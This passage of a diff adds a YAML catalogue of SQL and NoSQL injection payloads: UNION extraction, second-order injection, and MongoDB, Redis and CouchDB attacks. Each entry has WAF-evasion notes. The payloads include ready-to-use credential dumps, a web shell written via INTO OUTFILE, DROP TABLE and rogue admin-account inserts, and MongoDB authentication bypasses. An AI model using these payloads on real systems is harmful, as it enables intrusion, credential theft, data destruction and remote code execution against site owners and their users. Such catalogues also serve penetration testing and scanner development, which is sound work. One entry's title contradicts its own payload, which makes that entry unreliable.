+    - CVE-2014-3704
+    tags:
+    - union-based
+    - null-probe
+    - column-count
+    - type-compatible
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-union-003
+    title: UNION SELECT version extraction
+    payload_string: ''' UNION SELECT NULL,version(),NULL --'
+    how_it_works: 'Once the column count is known (3 in this example), individual NULLs are replaced with SQL expressions.
+      The version() function returns the database version string which appears in the application''s response at the position
+      of the second column. Knowing the exact database version guides subsequent exploitation: specific version bugs, function
+      availability, and compatibility of attack techniques all depend on the version. This is the first data extraction payload
+      after establishing column count.
+
+      '
+    prerequisites:
+    - 3-column query result
+    - String column in the second position
+    - Application reflects query results
+    waf_bypass_notes: Replace version() with other functions; use -- - comment style
+    severity_context: CVSS 7.5 – version disclosure leading to targeted exploitation
+    cve_refs:
+    - CVE-2017-8917
+    tags:
+    - union-based
+    - version-disclosure
+    - mysql
+    - data-extraction
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-union-004
+    title: UNION schema enumeration
+    payload_string: ''' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --'
+    how_it_works: 'information_schema.tables is a standard metadata view in MySQL, MSSQL, and PostgreSQL that lists all tables
+      in the database. By UNIONing with a SELECT from this view, the attacker retrieves table names from the current database.
+      This reveals the database schema structure, identifying tables of interest like ''users'', ''credentials'', ''orders'',
+      or ''admin''. Schema enumeration is a critical step in focused data theft, allowing the attacker to identify exactly
+      which tables to target.
+
+      '
+    prerequisites:
+    - Access to information_schema (MySQL, MSSQL, PostgreSQL)
+    - Correct column count matched
+    waf_bypass_notes: information_schema is a known WAF keyword; use /*!information_schema*/
+    severity_context: CVSS 7.5 – full database schema enumeration via information_schema
+    cve_refs:
+    - CVE-2017-8917
+    tags:
+    - union-based
+    - schema-enumeration
+    - information_schema
+    - reconnaissance
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-union-005
+    title: UNION credential extraction
+    payload_string: ''' UNION SELECT username,password,NULL FROM users --'
+    how_it_works: 'After identifying the users table via schema enumeration, this payload directly extracts usernames and
+      password hashes into the application''s response. The credentials appear in place of the normal query results. Depending
+      on the application''s authentication mechanism, these may be plaintext passwords, MD5/SHA1/bcrypt hashes, or tokens.
+      Hashes are cracked offline using tools like Hashcat or John the Ripper. This directly leads to account takeover for
+      all application users.
+
+      '
+    prerequisites:
+    - users table identified with username/password columns
+    - Correct column count
+    waf_bypass_notes: Direct data query; combine with base64 encoding for obfuscation
+    severity_context: CVSS 9.1 – full credential database dump via UNION injection
+    cve_refs:
+    - CVE-2014-3704
+    tags:
+    - union-based
+    - credential-extraction
+    - account-takeover
+    - high-impact
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-union-006
+    title: MySQL UNION into outfile
+    payload_string: ''' UNION SELECT ''<?php system($_GET["cmd"]); ?>'' INTO OUTFILE ''/var/www/html/shell.php'' --'
+    how_it_works: 'MySQL''s SELECT ... INTO OUTFILE writes query results to a file on the server''s filesystem. If the MySQL
+      user has FILE privilege and the web server directory is writable by the MySQL process, this payload writes a PHP web
+      shell to the web root. The attacker can then access the shell via HTTP to execute arbitrary OS commands. This escalates
+      SQL injection to Remote Code Execution (RCE). The secure_file_priv system variable must not restrict the target path.
+
+      '
+    prerequisites:
+    - MySQL with FILE privilege on database user
+    - Web server document root writable by MySQL process
+    - secure_file_priv is empty or includes target path
+    waf_bypass_notes: INTO OUTFILE is highly blocked; use hex encoding for path and shell
+    severity_context: CVSS 9.8 – SQLi to web shell via MySQL file write
+    cve_refs: []
+    tags:
+    - union-based
+    - file-write
+    - webshell
+    - rce
+    - mysql
+    - privilege-abuse
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-union-007
+    title: UNION with type coercion
+    payload_string: ''' UNION SELECT 1,2,3 FROM dual --'
+    how_it_works: 'When the original query uses integer columns, string injections like version() cause type mismatch errors.
+      Using integer literals (1, 2, 3) in the UNION SELECT confirms column count and identifies which columns are displayed
+      in the response (those that appear as ''1'', ''2'', or ''3''). The dual table (Oracle, or a virtual table in MySQL)
+      is used when a FROM clause is required. This technique identifies display columns before replacing integers with string-returning
+      functions.
+
+      '
+    prerequisites:
+    - Integer or mixed-type columns in original query
+    - Application displays at least one column value
+    waf_bypass_notes: Integer literals are less detected than function calls
+    severity_context: CVSS 5.3 – display column identification via integer UNION
+    cve_refs: []
+    tags:
+    - union-based
+    - type-coercion
+    - display-column
+    - integer-probe
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-union-008
+    title: UNION concatenate multiple values
+    payload_string: ''' UNION SELECT concat(username,0x3a,password),NULL FROM users --'
+    how_it_works: 'When only one column is displayed in the response, CONCAT combines multiple values with a delimiter (0x3a
+      = colon '':'') into a single string. This retrieves both username and password in one column, working around single-column
+      display limitations. GROUP_CONCAT can retrieve all rows in a single query result. CONCAT is standard in MySQL; || is
+      used in PostgreSQL and Oracle; + in MSSQL. This maximizes data extraction from single-column display contexts.
+
+      '
+    prerequisites:
+    - Only one display column available
+    - MySQL (concat syntax)
+    waf_bypass_notes: concat() is WAF-known; use char() with separate concat, or hex delimiters
+    severity_context: CVSS 8.5 – multi-value extraction through single display column
+    cve_refs: []
+    tags:
+    - union-based
+    - concat
+    - single-column
+    - credential-extraction
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-union-009
+    title: UNION GROUP_CONCAT all rows
+    payload_string: ''' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL,NULL FROM users --'
+    how_it_works: 'GROUP_CONCAT aggregates all rows into a single string, allowing extraction of the entire users table in
+      one request. The 0x0a (newline) separator makes the output human-readable. Without GROUP_CONCAT, multiple requests would
+      be needed to paginate through rows. The default GROUP_CONCAT max length is 1024 bytes; for large tables, set @@group_concat_max_len
+      higher (requires appropriate privileges). This is the most efficient single-request credential dump technique in MySQL.
+
+      '
+    prerequisites:
+    - MySQL or MariaDB
+    - At least one display column in query
+    waf_bypass_notes: GROUP_CONCAT is MySQL-specific; hex-encode separator to evade WAF
+    severity_context: CVSS 9.1 – full user table dump in single request
+    cve_refs: []
+    tags:
+    - union-based
+    - group_concat
+    - full-dump
+    - single-request
+    - efficient
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-union-010
+    title: Oracle UNION without FROM
+    payload_string: ''' UNION SELECT NULL,NULL FROM DUAL --'
+    how_it_works: 'Oracle requires a FROM clause in every SELECT statement, unlike MySQL which allows SELECT without FROM.
+      Oracle provides the DUAL dummy table for this purpose. Knowing this syntax difference is essential for Oracle-specific
+      UNION injection. After confirming the column count with DUAL, subsequent UNION selects target ALL_TABLES, USER_TABLES,
+      and ALL_COLUMNS for schema enumeration instead of information_schema which Oracle does not have.
+
+      '
+    prerequisites:
+    - Oracle Database
+    - DUAL table accessible (always available in Oracle)
+    waf_bypass_notes: Oracle-specific syntax; generic SQLi payloads may fail
+    severity_context: CVSS 7.5 – Oracle UNION injection setup via DUAL table
+    cve_refs: []
+    tags:
+    - union-based
+    - oracle
+    - dual-table
+    - database-specific
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: second-order
+  name: Second-Order SQL Injection
+  description: Input is stored safely on first use but later retrieved and incorporated into a SQL query without sanitization,
+    with a time delay between injection and execution.
+  difficulty: high
+  prerequisites:
+  - Application stores user input in database
+  - Stored input later used in SQL query without parameterization
+  - Attacker can trigger the vulnerable code path
+  payloads:
+  - id: sqli-2ord-001
+    title: Username change second-order
+    payload_string: admin'--
+    how_it_works: 'An attacker registers with the username "admin''--". The registration safely stores this value (INSERT
+      with parameterization). When the user later changes their password, the application retrieves the stored username and
+      uses it in an UPDATE query without parameterization: UPDATE users SET password=''X'' WHERE username=''admin''--''. The
+      double-dash comments out the password check, and the UPDATE applies to the admin user''s account rather than the attacker''s.
+      This grants the attacker control of the admin password.
+
+      '
+    prerequisites:
+    - Username stored and later used in non-parameterized UPDATE
+    - Attacker can register arbitrary usernames
+    waf_bypass_notes: Stored at write time; WAF inspection at write may not catch injection effect
+    severity_context: CVSS 8.8 – admin password takeover via second-order SQLi in password change
+    cve_refs:
+    - CVE-2014-2972
+    tags:
+    - second-order
+    - username-injection
+    - password-change
+    - account-takeover
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-2ord-002
+    title: Profile field second-order in report
+    payload_string: ''' UNION SELECT username,password FROM users --'
+    how_it_works: 'An attacker stores a UNION SELECT payload in a profile field such as first name or company. When an admin
+      or report generator uses this profile data in a SQL query (e.g., SELECT * FROM orders WHERE customer_name=''[stored_value]''),
+      the UNION injects extra rows. The report may display extracted data alongside expected results. Second-order injection
+      in reporting systems is particularly dangerous because the trigger (report generation) may occur automatically on a
+      schedule, affecting multiple users'' reports.
+
+      '
+    prerequisites:
+    - Profile data used in report-generating SQL query
+    - Report output visible to attacker or admin
+    waf_bypass_notes: Two-stage attack; injection stored as clean data; fired on report generation
+    severity_context: CVSS 8.5 – second-order UNION injection in reporting system
+    cve_refs:
+    - CVE-2014-2972
+    tags:
+    - second-order
+    - profile-field
+    - report-injection
+    - union
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-2ord-003
+    title: Email field second-order in password reset
+    payload_string: attacker@evil.com'||(SELECT password FROM users LIMIT 1)||'@evil.com
+    how_it_works: 'The attacker registers with an email address containing SQL. During password reset, the application queries
+      by email address without parameterization. The concatenation operators (||) append the first user''s password to the
+      attacker''s email domain in the WHERE clause, effectively including the admin password in the query comparison string.
+      Depending on the query behavior, this can bypass email validation or leak the password in error messages. Second-order
+      injection in authentication flows is a severe vector.
+
+      '
+    prerequisites:
+    - Email stored and used in non-parameterized password reset query
+    - PostgreSQL or Oracle (uses || concatenation)
+    waf_bypass_notes: Email addresses are rarely sanitized for SQL injection
+    severity_context: CVSS 8.8 – second-order SQLi in password reset via email field
+    cve_refs:
+    - CVE-2014-2972
+    tags:
+    - second-order
+    - email-field
+    - password-reset
+    - concatenation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-2ord-004
+    title: Stored address in shipping query
+    payload_string: 123 Main St'; DROP TABLE orders; --
+    how_it_works: 'Address fields are typically stored with parameterized queries but may be later used in dynamically constructed
+      queries for reporting, shipping label generation, or order fulfillment systems. If the stored address contains SQL metacharacters
+      and the downstream system is vulnerable, a DROP TABLE or other destructive operation executes. This demonstrates that
+      SQL injection can have delayed destructive impact and that second-order injection can affect entirely different application
+      components from where the data was entered.
+
+      '
+    prerequisites:
+    - Address stored safely but used in dynamic SQL in downstream system
+    - Downstream system allows DDL operations
+    waf_bypass_notes: Destructive payload; would fire in downstream fulfillment system
+    severity_context: CVSS 9.1 – destructive second-order DDL injection in order processing
+    cve_refs: []
+    tags:
+    - second-order
+    - address-field
+    - drop-table
+    - destructive
+    - ddl
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-2ord-005
+    title: User preference JSON second-order
+    payload_string: '{"theme": "dark'' UNION SELECT password,NULL FROM users --"}'
+    how_it_works: 'Applications that store user preferences as JSON and later use preference values in SQL queries (e.g.,
+      loading preference-specific content) may be vulnerable to second-order injection via the JSON values. The theme value
+      is stored as valid JSON but contains SQL injection. When the application fetches content based on the theme preference
+      using a dynamic query, the injected UNION executes. This is a modern variant of second-order injection targeting preference/settings
+      features.
+
+      '
+    prerequisites:
+    - User preference values stored and used in SQL query
+    - No re-sanitization on read
+    waf_bypass_notes: JSON values stored as-is; WAF may not inspect nested JSON string values
+    severity_context: CVSS 7.5 – second-order SQLi via user preferences/settings
+    cve_refs: []
+    tags:
+    - second-order
+    - json-preference
+    - settings
+    - modern-app
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-2ord-006
+    title: Second-order SQLi via avatar/image URL stored field
+    payload_string: https://attacker.com/img.png' OR '1'='1
+    how_it_works: 'Applications that store an image URL in a user profile and later construct SQL queries using that URL are
+      vulnerable to second-order SQL injection. The malicious SQL is stored as part of the URL string during registration
+      or profile update, appearing harmless at that stage since it is not used in a query immediately. When an administrator
+      or reporting module later queries the database using the stored URL as a WHERE clause parameter, the injected OR condition
+      fires. This pattern is particularly common in content management systems that aggregate user media URLs for reporting
+      or batch operations. The attacker gains the ability to manipulate query results or exfiltrate data from the reporting
+      context.
+
+      '
+    prerequisites:
+    - User-supplied URL stored in database without parameterisation
+    - Stored URL used in subsequent SQL query without re-encoding
+    waf_bypass_notes: WAF does not inspect stored database values used in later queries
+    severity_context: CVSS 8.8 – second-order SQLi via stored avatar URL field
+    cve_refs: []
+    tags:
+    - second-order
+    - url-field
+    - avatar
+    - profile
+    - stored
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-2ord-007
+    title: Second-order SQLi in scheduled report generation
+    payload_string: Monthly Report'; INSERT INTO admin_accounts VALUES('hacker','hash')--
+    how_it_works: 'Scheduled report generation systems often store report names, filter parameters, or recipient lists provided
+      by users, then use those stored values to construct SQL queries when the scheduler fires. An attacker who can set a
+      report name or parameter containing SQL injects malicious statements that execute with the scheduler''s database permissions,
+      often higher than normal user permissions. The injected INSERT creates a new admin account, providing persistent access.
+      This class of attack is particularly dangerous because the payload may execute hours or days after injection, making
+      forensic correlation more difficult, and because report schedulers frequently run with elevated database roles.
+
+      '
+    prerequisites:
+    - Report scheduler uses stored user-provided values in SQL without parameterisation
+    - Scheduler's database role has INSERT/UPDATE privileges on sensitive tables
+    waf_bypass_notes: Scheduler execution context not inspected by runtime WAF
+    severity_context: CVSS 9.0 – second-order SQLi in scheduler leading to privilege escalation
+    cve_refs: []
+    tags:
+    - second-order
+    - scheduler
+    - report
+    - insert
+    - privilege-escalation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-2ord-008
+    title: Second-order SQLi via stored email address in notification template
+    payload_string: victim@example.com' UNION SELECT password,2,3 FROM users--
+    how_it_works: 'Email notification systems that dynamically query recipient details using stored email addresses can be
+      exploited when the stored email is used unsafely in SQL. An attacker registers with a maliciously crafted email address;
+      when the notification system later builds a query to fetch display name or preferences using the stored email, the UNION
+      SELECT clause appends an additional result set. The results may be included in the notification content or logged, leaking
+      password hashes or other sensitive columns. This attack relies on the notification system having SELECT access to the
+      users table, which is typical for systems that look up display names for personalised messages.
+
+      '
+    prerequisites:
+    - Notification system queries database using stored email without parameterisation
+    - users table accessible to the notification module's database user
+    waf_bypass_notes: Email field validation may block angle brackets but not SQL keywords
+    severity_context: CVSS 8.8 – second-order SQLi via email field in notification query
+    cve_refs: []
+    tags:
+    - second-order
+    - email
+    - notification
+    - union
+    - data-exfiltration
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-2ord-009
+    title: Second-order SQLi via stored search filter term
+    payload_string: laptop%' UNION SELECT null,table_name,null FROM information_schema.tables--
+    how_it_works: 'Many applications allow users to save search filters or shopping cart queries that are re-executed when
+      the user returns. The stored filter term is retrieved from the database and used to construct a LIKE query. By saving
+      a term containing a UNION SELECT statement, the attacker causes the saved-search feature to execute information schema
+      queries. The returned table names can be used to map the database schema and identify high-value tables for subsequent
+      exfiltration. This is a low-visibility attack because the injection fires as part of normal application functionality
+      (loading a saved search) rather than a direct attack request, making detection by intrusion detection systems more difficult.
+
+      '
+    prerequisites:
+    - Saved search or filter stored and reused in SQL LIKE query
+    - Application reflects or processes query results in a way the attacker can observe
+    waf_bypass_notes: Percent wildcard encoding combined with UNION obscures intent
+    severity_context: CVSS 8.8 – second-order SQLi via saved search LIKE injection
+    cve_refs: []
+    tags:
+    - second-order
+    - search-filter
+    - saved-search
+    - union
+    - information-schema
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-2ord-010
+    title: Second-order SQLi via stored API key in audit log query
+    payload_string: api_key_value' OR 1=1 LIMIT 1000--
+    how_it_works: 'Audit logging systems that store API keys and later display usage logs by querying for records matching
+      the stored key can be vulnerable to second-order injection. An attacker who can register an API key with embedded SQL
+      then requests the audit log for their key; the audit system constructs a WHERE api_key = ''stored_value'' query using
+      the stored key without sanitisation. The OR 1=1 clause returns all audit records for all users, potentially leaking
+      sensitive operation history. The LIMIT clause prevents overwhelming the result set while still demonstrating the vulnerability.
+      This technique is relevant in multi-tenant SaaS platforms where audit logs contain cross-tenant data guarded only by
+      the API key filter.
+
+      '
+    prerequisites:
+    - Audit log query uses stored API key value in WHERE clause without parameterisation
+    - Audit table contains cross-user or cross-tenant records
+    waf_bypass_notes: API key fields are rarely inspected by WAF for SQL patterns
+    severity_context: CVSS 8.8 – second-order SQLi via API key in audit log query
+    cve_refs: []
+    tags:
+    - second-order
+    - api-key
+    - audit-log
+    - or-tautology
+    - multi-tenant
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: nosql
+  name: NoSQL Injection
+  description: Attacks targeting NoSQL databases (MongoDB, CouchDB, Redis) by manipulating query operators, injecting server-side
+    JavaScript, or abusing query structure.
+  difficulty: medium
+  prerequisites:
+  - Application uses a NoSQL database (MongoDB, CouchDB, Redis)
+  - User input incorporated into database queries without sanitization
+  payloads:
+  - id: sqli-nosql-001
+    title: MongoDB operator injection authentication bypass
+    payload_string: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    how_it_works: 'MongoDB query operators like $gt (greater than) can be injected when the application accepts JSON or constructs
+      queries from user-supplied objects. The $gt: "" condition matches any non-empty string, effectively making both the
+      username and password conditions true for any user. This bypasses authentication by returning the first user record
+      regardless of credential validity. In Express.js applications that pass req.body directly to Mongoose queries, this
+      is a common vulnerability.
+
+      '
+    prerequisites:
+    - MongoDB backend with Mongoose or native driver
+    - Application passes user-supplied JSON to find() or findOne()
+    waf_bypass_notes: WAFs rarely inspect MongoDB operator injection; target JSON bodies
+    severity_context: CVSS 9.8 – authentication bypass via MongoDB query operator injection
+    cve_refs:
+    - CVE-2013-4650
+    tags:
+    - nosql
+    - mongodb
+    - operator-injection
+    - auth-bypass
+    - json-body
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-nosql-002
+    title: MongoDB $where JavaScript injection
+    payload_string: '''; return true; //'
+    how_it_works: 'MongoDB''s $where operator allows JavaScript expressions to be evaluated server-side for document filtering.
+      If user input is incorporated into a $where query without sanitization, arbitrary JavaScript executes on the MongoDB
+      server. Injecting a return true; statement makes the query match all documents. More sophisticated payloads use sleep()
+      for time-based blind injection or access file system APIs. Server-side JavaScript execution is disabled by default in
+      MongoDB 4.4+ but remains in legacy deployments.
+
+      '
+    prerequisites:
+    - MongoDB with server-side JavaScript enabled
+    - Application uses $where with user input
+    waf_bypass_notes: $where is disabled in modern MongoDB; target legacy deployments
+    severity_context: CVSS 8.8 – server-side JavaScript execution in MongoDB via $where
+    cve_refs:
+    - CVE-2013-4650
+    tags:
+    - nosql
+    - mongodb
+    - where-injection
+    - js-execution
+    - legacy
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-nosql-003
+    title: MongoDB $regex injection for enumeration
+    payload_string: '{"username": "admin", "password": {"$regex": "^a"}}'
+    how_it_works: 'MongoDB''s $regex operator enables regular expression matching. By injecting $regex as the password comparison
+      operator, the attacker tests whether the password starts with a specific character pattern. Starting with ''^a'', then
+      ''^b'', etc., the attacker performs a character-by-character brute force of the password — analogous to boolean blind
+      SQL injection. Each request reveals one character. This technique works against any application that passes user-supplied
+      query operators to MongoDB.
+
+      '
+    prerequisites:
+    - MongoDB backend
+    - Application passes JSON body to database query
+    - Authentication endpoint returns different responses for valid/invalid credentials
+    waf_bypass_notes: Observable response difference required; works like boolean blind SQLi
+    severity_context: CVSS 7.5 – character-by-character password extraction via MongoDB regex
+    cve_refs:
+    - CVE-2013-4650
+    tags:
+    - nosql
+    - mongodb
+    - regex-injection
+    - blind-extraction
+    - boolean-blind
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-nosql-004
+    title: PHP MongoDB array injection
+    payload_string: username=admin&password[$ne]=wrongpassword
+    how_it_works: 'In PHP applications, query string parameters can encode arrays using bracket notation. password[$ne]=wrongpassword
+      constructs a MongoDB query condition {password: {$ne: ''wrongpassword''}}, which matches any user whose password is
+      not ''wrongpassword'' — i.e., any user at all. Combined with a valid username, this retrieves the admin user''s record,
+      bypassing authentication. This is the URL-encoded form of the JSON operator injection and affects PHP applications using
+      $_GET or $_POST with MongoDB drivers.
+
+      '
+    prerequisites:
+    - PHP application with MongoDB backend
+    - PHP allows array notation in query parameters
+    - Application uses $_GET/$_POST directly in MongoDB query
+    waf_bypass_notes: URL parameter array notation; WAFs may not parse PHP array bracket syntax
+    severity_context: CVSS 9.8 – PHP array notation MongoDB auth bypass
+    cve_refs:
+    - CVE-2013-4650
+    tags:
+    - nosql
+    - mongodb
+    - php-array
+    - url-injection
+    - auth-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-nosql-005
+    title: Redis command injection via CRLF
+    payload_string: "key\r\nSET admin_password hacked\r\n"
+    how_it_works: 'Redis uses a text-based protocol (RESP) where commands are separated by CRLF sequences. If a Redis key
+      or command parameter contains CRLF characters that are passed unsanitized to the Redis connection, the CRLF sequences
+      inject new Redis commands. In this example, a SET command overwrites the admin password. This requires that the application
+      passes user-supplied data to Redis commands without stripping CRLF characters. It is a protocol-level injection rather
+      than a query language injection.
+
+      '
+    prerequisites:
+    - Application passes user input to Redis commands
+    - CRLF characters not stripped from Redis parameters
+    - Redis accessible without authentication or with known auth
+    waf_bypass_notes: CRLF injection in Redis protocol; %0d%0a URL encoding
+    severity_context: CVSS 8.8 – Redis CRLF injection for arbitrary command execution
+    cve_refs:
+    - CVE-2022-0543
+    tags:
+    - nosql
+    - redis
+    - crlf-injection
+    - protocol-injection
+    - command-injection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-nosql-006
+    title: CouchDB MapReduce JavaScript injection
+    payload_string: function(doc){ if(doc._id == 'admin') { emit(doc._id, doc); }}
+    how_it_works: 'CouchDB uses JavaScript-based MapReduce views for querying. If a user-supplied design document or view
+      function is accepted by the application, arbitrary JavaScript executes on the CouchDB server. An attacker can access
+      all documents in the database by emitting them, perform server-side operations, or attempt to access the file system
+      via Node.js APIs (in vulnerable configurations). This requires the ability to create or modify CouchDB design documents.
+
+      '
+    prerequisites:
+    - CouchDB backend
+    - Attacker can create or modify design documents
+    - Application passes user-supplied view functions to CouchDB
+    waf_bypass_notes: JavaScript function injection; specific to CouchDB admin interfaces
+    severity_context: CVSS 8.5 – CouchDB MapReduce JavaScript execution for data access
+    cve_refs: []
+    tags:
+    - nosql
+    - couchdb
+    - mapreduce
+    - js-injection
+    - design-document
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-nosql-007
+    title: MongoDB $where Operator Arbitrary JavaScript Execution
+    payload_string: '{"$where": "function() { return this.password.match(/^a/); }"}
+
+      '
+    encoding: none
+    how_it_works: 'MongoDB''s $where operator accepts a JavaScript function string and evaluates it server-side against each
+      document in the collection, enabling arbitrary logic execution. An attacker can inject boolean-returning functions to
+      enumerate field values character by character (blind extraction) or execute time-delay functions for timing-based confirmation.
+      Modern MongoDB versions disable $where by default; legacy deployments and misconfigured instances remain vulnerable,
+      particularly where the JS engine is not restricted.
+
+      '
+    context_of_use: MongoDB query parameters passed without sanitization
+    requires:
+    - MongoDB with server-side JS enabled ($where not disabled)
+    - Application reflects or behaves differently based on query result
+    waf_bypass_notes: Obfuscate via Unicode escapes in JS string; split function across encoded fields
+    severity_context: CVSS 8.1 – arbitrary JS execution enabling blind field enumeration and data theft
+    cve_refs:
+    - CVE-2013-4650
+    tags:
+    - nosql
+    - mongodb
+    - where-js
+    - blind-extraction
+    - server-side-js
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-nosql-008
+    title: Redis EVAL Lua Script Injection via Cached Key
+    payload_string: 'EVAL "return redis.call(''keys'',''*'')" 0
+
+      '
+    encoding: none
+    how_it_works: 'Redis exposes a Lua scripting interface via the EVAL command that executes scripts atomically in the Redis
+      engine, bypassing ACL restrictions on individual commands. When an application constructs Redis commands from user input
+      without sanitization, an attacker can inject EVAL with a Lua payload to enumerate keys, read arbitrary key values, or
+      abuse redis.call() to chain privileged operations against the datastore. This is distinct from SSRF-based Redis attacks;
+      here the injection is within the application''s Redis client command construction pipeline.
+
+      '
+    context_of_use: Applications building raw Redis command strings from user input
+    requires:
+    - Redis accessible by application with EVAL not disabled via rename-command
+    - User input reaches Redis command construction without sanitization
+    waf_bypass_notes: Encode Lua string in hex literals; split across multiple EVAL calls
+    severity_context: CVSS 8.8 – full keyspace enumeration and arbitrary data read/write
+    cve_refs:
+    - CVE-2022-0543
+    tags:
+    - nosql
+    - redis
+    - lua-injection
+    - eval
+    - command-injection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-nosql-009
+    title: MongoDB $regex Operator Blind Field Enumeration
+    payload_string: '{"username": "admin", "password": {"$regex": "^a"}}
+
+      '
+    encoding: none
+    how_it_works: 'MongoDB''s $regex operator enables pattern matching within query predicates. By iterating the regex anchor
+      character by character (^a, ^ab, ^abc …), an attacker can determine the exact value of a field through boolean-blind
+      enumeration based on whether the query returns a result or not. This technique is effective against login endpoints
+      that reflect authentication success or failure, allowing full password (or secret field) extraction without triggering
+      brute-force thresholds that count distinct attempts rather than regex variations.
+
+      '
+    context_of_use: MongoDB-backed login or search endpoints accepting JSON body parameters
+    requires:
+    - Application passes unsanitized JSON keys to MongoDB query
+    - Observable boolean difference in application response
+    waf_bypass_notes: Encode $ as %24 in URL parameters; use nested $options for case-insensitive enumeration
+    severity_context: CVSS 7.5 – blind field value extraction through response timing or boolean differences
+    cve_refs:
+    - CVE-2013-4650
+    tags:
+    - nosql
+    - mongodb
+    - regex-blind
+    - operator-injection
+    - enumeration
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: sqli-nosql-010
+    title: MongoDB $ne Operator Authentication Bypass
+    payload_string: '{"username": "admin", "password": {"$ne": "invalid_value_xyz"}}
+
+      '
+    encoding: none
+    how_it_works: 'MongoDB''s $ne (not-equal) comparison operator injected into a password field causes the query predicate
+      to evaluate as true for any stored password that is not equal to the supplied dummy value, effectively bypassing password
+      verification entirely. This attack requires the application to pass JSON body parameters directly into a MongoDB find()
+      or findOne() query without stripping operator keys. It is one of the most reliable NoSQL authentication bypasses because
+      the $ne operator is universally supported across MongoDB versions and requires no server-side JS.
+
+      '
+    context_of_use: MongoDB-backed authentication endpoints accepting JSON request bodies
+    requires:
+    - Application constructs MongoDB query directly from parsed JSON body
+    - No input sanitization to strip $ prefixed keys
+    waf_bypass_notes: URL-encode $ as %24 for form-data submissions; nest inside $or for complex bypasses
+    severity_context: CVSS 9.1 – authentication bypass granting unauthorized admin access
+    cve_refs:
+    - CVE-2013-4650
+    tags:
+    - nosql
+    - mongodb
+    - ne-operator
+    - auth-bypass
+    - operator-injection
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
